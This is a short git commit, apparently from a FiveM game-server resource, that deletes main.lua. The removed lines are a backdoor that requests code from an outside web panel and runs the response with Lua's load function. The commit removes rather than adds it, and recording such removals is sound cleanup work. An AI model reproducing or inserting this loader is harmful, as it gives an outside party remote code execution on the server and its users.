10ca57dac0fa2c52cbdfe0fc43d7147eeb62b0b8
banappeals <167147145+banappeals@users.noreply.github.com>
2024-10-18 16:11:39 -0400

    Delete main.lua

--- main.lua
+++
@@ -1,2 +0,0 @@
-local _v = PerformHttpRequestInternalEx{url='https://apiwebpanel.org/giXWm', method='GET'} 
-AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b)  if _v == _t then pcall(function() assert(load(d))() end) end end)
